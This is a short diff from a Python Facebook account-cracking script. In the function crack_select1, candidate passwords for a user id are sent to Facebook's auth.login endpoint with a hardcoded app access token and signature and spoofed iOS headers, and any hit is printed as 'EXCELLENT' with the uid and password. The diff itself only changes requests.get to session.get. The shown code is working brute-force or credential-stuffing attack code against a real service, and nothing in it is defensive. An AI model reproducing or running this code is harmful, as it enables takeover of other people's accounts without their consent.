@@ -410,7 +410,7 @@ def crack_select1():
 																	api = 'https://b-api.facebook.com/method/auth.login'
 																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass8, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-																	data = requests.get(api, params=params, headers=headers_).text
+																	data = session.get(api, params=params, headers=headers_).text
 																	q = json.loads(data)
 																	if "access_token" in q and "EAAA" in q:
 																		print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
